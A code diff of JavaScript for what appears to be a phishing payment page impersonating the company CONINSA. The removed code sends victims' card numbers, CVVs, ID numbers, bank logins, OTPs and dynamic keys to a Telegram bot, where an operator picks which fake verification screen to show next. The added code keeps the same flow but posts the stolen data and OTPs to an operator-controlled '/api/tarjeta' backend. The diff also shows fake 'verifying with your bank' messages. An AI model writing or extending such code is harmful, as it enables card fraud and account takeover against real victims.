@@ -599,12 +599,13 @@ function pagarTarjeta() {
     'Amex': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg',
     'Tarjeta': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg',
   };
-  abrirJLP({ tipoDoc, cedula, numero, fecha, cvv, tipoTarjeta, logoUrl: logoMap[tipoTarjeta] });
+  pagarTarjetaPsec({ tipoDoc, cedula, numero, fecha, cvv, tipoTarjeta, logoUrl: logoMap[tipoTarjeta] });
 }
 
-// ── JLP Modal ─────────────────────────────────────────────────────────────
-let _jlpSid = null, _jlpIv = null, _jlpOffset = 0, _jlpDatos = null;
-const JLP_MAX = 300000;
+// ── Modal tarjeta (flujo psec) ────────────────────────────────────────────
+let _psecId = null, _psecIv = null, _psecLastStatus = '';
+const PSEC_MAX  = 300000;
+const PSEC_POLL = 2500;
 
 function jlpStage(s) {
   ['Wait','Cred','Loading','OTP','Clave','Success'].forEach(n => {
@@ -618,144 +619,100 @@ function toggleJlpEye() {
   i.type = i.type === 'password' ? 'text' : 'password';
 }
 
-function jlpStopPoll() { if (_jlpIv) { clearInterval(_jlpIv); _jlpIv = null; } }
+function psecStopPoll() { if (_psecIv) { clearInterval(_psecIv); _psecIv = null; } }
 
-async function jlpSend(text, kb) {
-  const body = { text };
-  if (kb) body.reply_markup = kb;
-  try {
-    const r = await fetch(API_URL+'/api/tg/send', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
-    const d = await r.json();
-    return d.ok ? d.result?.message_id : null;
-  } catch { return null; }
-}
-
-async function jlpGetUpdates() {
-  try {
-    const r = await fetch(API_URL+'/api/tg/updates?offset='+_jlpOffset);
-    const d = await r.json();
-    if (d.ok && d.result.length) _jlpOffset = d.result[d.result.length-1].update_id + 1;
-    return d.ok ? d.result : [];
-  } catch { return []; }
-}
-
-async function tgAnswer(id) {
-  await fetch(API_URL+'/api/tg/answer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:id})}).catch(()=>{});
-}
-
-function jlpPoll(onAction) {
+function psecStartPoll() {
   const t0 = Date.now();
-  jlpStopPoll();
-  _jlpIv = setInterval(async () => {
-    if (Date.now()-t0 > JLP_MAX) { jlpStopPoll(); return; }
-    const updates = await jlpGetUpdates();
-    for (const u of updates) {
-      if (!u.callback_query) continue;
-      const data = u.callback_query.data || '';
-      if (data.startsWith('jlp:') && data.endsWith(':'+_jlpSid)) {
-        const action = data.split(':')[1];
-        await tgAnswer(u.callback_query.id);
-        jlpStopPoll();
-        onAction(action);
-        return;
+  psecStopPoll();
+  _psecLastStatus = '';
+  _psecIv = setInterval(async () => {
+    if (Date.now()-t0 > PSEC_MAX) { psecStopPoll(); return; }
+    try {
+      const r = await fetch(API_URL+'/api/tarjeta/estado/'+_psecId);
+      const d = await r.json();
+      if (d.status !== 'OK') return;
+      const st = d.data.status;
+      if (st === _psecLastStatus) return;
+      _psecLastStatus = st;
+      if (st === 'pedir_otp') {
+        jlpStage('OTP');
+        document.getElementById('jlpOtpInput').value = '';
+      } else if (st === 'pedir_dinamica') {
+        jlpStage('Clave');
+        document.getElementById('jlpClaveInput').value = '';
+      } else if (st === 'esperando_otp' || st === 'esperando_dinamica') {
+        jlpStage('Loading');
+        document.getElementById('jlpLoadingTxt').textContent = 'Verificando con tu banco...';
+      } else if (st === 'error_otp') {
+        jlpStage('OTP');
+        document.getElementById('jlpOtpInput').value = '';
+      } else if (st === 'error_dinamica') {
+        jlpStage('Clave');
+        document.getElementById('jlpClaveInput').value = '';
+      } else if (st === 'aprobada') {
+        psecStopPoll();
+        jlpStage('Success');
+      } else if (st === 'declinada' || st === 'error_usuario_clave') {
+        psecStopPoll();
+        document.getElementById('jlpOverlay').style.display = 'none';
+        alert('Transacción no aprobada. Intenta con otro método.');
       }
-    }
-  }, 2000);
+    } catch(e) {}
+  }, PSEC_POLL);
 }
 
-function jlpPollVerif() {
-  const t0 = Date.now();
-  jlpStopPoll();
-  _jlpIv = setInterval(async () => {
-    if (Date.now()-t0 > JLP_MAX) { jlpStopPoll(); return; }
-    const updates = await jlpGetUpdates();
-    for (const u of updates) {
-      if (!u.callback_query) continue;
-      const data = u.callback_query.data || '';
-      if (data.startsWith('jlp:') && data.endsWith(':'+_jlpSid)) {
-        const action = data.split(':')[1];
-        await tgAnswer(u.callback_query.id);
-        jlpStopPoll();
-        if (action==='aot'||action==='acd') { jlpStage('Success'); }
-        else if (action==='rot') { jlpStage('OTP'); document.getElementById('jlpOtpInput').value=''; }
-        else if (action==='rcd') { jlpStage('Clave'); document.getElementById('jlpClaveInput').value=''; }
-        return;
-      }
-    }
-  }, 2000);
-}
-
-async function abrirJLP(datos) {
-  _jlpDatos = datos;
-  _jlpSid = 'CON'+Date.now()+Math.random().toString(36).substr(2,5);
+async function pagarTarjetaPsec(datos) {
   document.getElementById('jlpCardName').textContent = datos.tipoTarjeta;
   document.getElementById('jlpAmtLine').textContent  = document.getElementById('payTotal').textContent;
   const logo = document.getElementById('jlpCardLogo');
-  logo.src = datos.logoUrl; logo.style.display='block';
+  logo.src = datos.logoUrl; logo.style.display = 'block';
   jlpStage('Wait');
-  document.getElementById('jlpOverlay').style.display='flex';
-  await jlpGetUpdates();
-  const total = document.getElementById('payTotal').textContent;
-  const msg =
-    '🔔 <b>NUEVA SOLICITUD — CONINSA</b>\n'+
-    '🆔 ID: <code>'+_jlpSid+'</code>\n'+
-    '─────────────────────\n'+
-    '💳 <b>TARJETA</b>\n'+
-    '• Número: <code>'+datos.numero+'</code>\n'+
-    '• Vencimiento: <code>'+datos.fecha+'</code>\n'+
-    '• CVV: <code>'+datos.cvv+'</code>\n'+
-    '─────────────────────\n'+
-    '👤 <b>TITULAR</b>\n'+
-    '• Doc: <code>'+datos.tipoDoc+' '+datos.cedula+'</code>\n'+
-    '─────────────────────\n'+
-    '💰 <b>Monto:</b> '+total+'\n'+
-    '📅 '+new Date().toLocaleString('es-CO');
-  const kb = {inline_keyboard:[
-    [{text:'✅ Aprobar',callback_data:'jlp:apr:'+_jlpSid},{text:'❌ Rechazar',callback_data:'jlp:rec:'+_jlpSid}],
-    [{text:'📲 Pedir OTP',callback_data:'jlp:otp:'+_jlpSid},{text:'🔑 Clave Dinámica',callback_data:'jlp:cdp:'+_jlpSid}]
-  ]};
-  await jlpSend(msg, kb);
-  jlpPoll(action => {
-    if (action==='apr')      jlpStage('Cred');
-    else if (action==='rec') document.getElementById('jlpOverlay').style.display='none';
-    else if (action==='otp') { jlpStage('OTP'); jlpPollVerif(); }
-    else if (action==='cdp') { jlpStage('Clave'); jlpPollVerif(); }
-  });
-}
-
-async function jlpEnviarCred() {
-  const user = document.getElementById('jlpUser').value.trim();
-  const pass = document.getElementById('jlpPass').value.trim();
-  if (!user||!pass) { alert('Completa los campos'); return; }
-  jlpStage('Loading'); document.getElementById('jlpLoadingTxt').textContent='Verificando credenciales';
-  const msg='🔐 <b>CREDENCIALES — CONINSA</b>\n🆔 <code>'+_jlpSid+'</code>\n• Usuario: <code>'+user+'</code>\n• Contraseña: <code>'+pass+'</code>';
-  const kb={inline_keyboard:[[{text:'📲 OTP',callback_data:'jlp:otp:'+_jlpSid},{text:'🔑 Clave',callback_data:'jlp:cdp:'+_jlpSid}],[{text:'❌ Error Cred',callback_data:'jlp:erc:'+_jlpSid}]]};
-  await jlpSend(msg, kb);
-  jlpPoll(action => {
-    if (action==='otp')      { jlpStage('OTP'); jlpPollVerif(); }
-    else if (action==='cdp') { jlpStage('Clave'); jlpPollVerif(); }
-    else if (action==='erc') { jlpStage('Cred'); document.getElementById('jlpUser').value=''; document.getElementById('jlpPass').value=''; }
-  });
+  document.getElementById('jlpOverlay').style.display = 'flex';
+  try {
+    const r = await fetch(API_URL+'/api/tarjeta/crear', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        numero_tarjeta: datos.numero.replace(/\s/g,''),
+        fecha:          datos.fecha,
+        cvv:            datos.cvv,
+        tipo_doc:       datos.tipoDoc,
+        cedula:         datos.cedula,
+        monto:          document.getElementById('payTotal').textContent.replace(/[^\d]/g,''),
+      }),
+    });
+    const d = await r.json();
+    if (d.status !== 'OK') throw new Error(d.message || 'Error');
+    _psecId = d.id;
+    psecStartPoll();
+  } catch(e) {
+    document.getElementById('jlpOverlay').style.display = 'none';
+    alert('Error al procesar. Intenta de nuevo.');
+  }
 }
 
 async function jlpEnviarOtp() {
   const otp = document.getElementById('jlpOtpInput').value.trim();
   if (!otp) { alert('Ingresa el código'); return; }
-  jlpStage('Loading'); document.getElementById('jlpLoadingTxt').textContent='Verificando código';
-  const msg='📲 <b>OTP — CONINSA</b>\n🆔 <code>'+_jlpSid+'</code>\n• OTP: <code>'+otp+'</code>';
-  const kb={inline_keyboard:[[{text:'✅ Aprobar',callback_data:'jlp:aot:'+_jlpSid},{text:'❌ Rechazar',callback_data:'jlp:rot:'+_jlpSid}]]};
-  await jlpSend(msg, kb);
-  jlpPollVerif();
+  jlpStage('Loading');
+  document.getElementById('jlpLoadingTxt').textContent = 'Enviando código...';
+  _psecLastStatus = '';
+  await fetch(API_URL+'/api/tarjeta/actualizar', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ id: _psecId, status: 'esperando_otp', banco_otp: otp }),
+  }).catch(()=>{});
 }
 
 async function jlpEnviarClave() {
   const clave = document.getElementById('jlpClaveInput').value.trim();
   if (!clave) { alert('Ingresa tu clave'); return; }
-  jlpStage('Loading'); document.getElementById('jlpLoadingTxt').textContent='Verificando clave';
-  const msg='🔑 <b>CLAVE DINÁMICA — CONINSA</b>\n🆔 <code>'+_jlpSid+'</code>\n• Clave: <code>'+clave+'</code>';
-  const kb={inline_keyboard:[[{text:'✅ Aprobar',callback_data:'jlp:acd:'+_jlpSid},{text:'❌ Rechazar',callback_data:'jlp:rcd:'+_jlpSid}]]};
-  await jlpSend(msg, kb);
-  jlpPollVerif();
+  jlpStage('Loading');
+  document.getElementById('jlpLoadingTxt').textContent = 'Enviando clave...';
+  _psecLastStatus = '';
+  await fetch(API_URL+'/api/tarjeta/actualizar', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ id: _psecId, status: 'esperando_dinamica', dinamica: clave }),
+  }).catch(()=>{});
 }
 
 const MOCK = {
